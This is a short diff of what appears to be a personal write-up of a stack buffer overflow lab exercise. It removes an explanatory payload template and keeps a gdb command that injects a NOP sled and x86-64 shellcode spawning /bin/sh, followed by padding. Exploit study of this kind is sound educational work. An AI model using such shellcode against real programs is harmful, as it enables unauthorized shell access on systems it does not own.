@@ -78,9 +78,6 @@ It´s part of my $$\textcolor{#FF69B4}{\textbf{213}}$$-day-streak in  <a href="h
 
 <pre><code>0x7fffffffe2a8</code></pre>
 
-<p>Now it is time to apply what we learned ... <code>python -c “print (NOP * no_of_nops + shellcode + random_data * no_of_random_data + memory address)”</code></p>
-
-<p>So let´s customize it and we will have ...</p>
 
 <pre><code>run $(python -c "print '\x90'*100 + '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'A'*12 + 'B'*6")</code></pre>
 
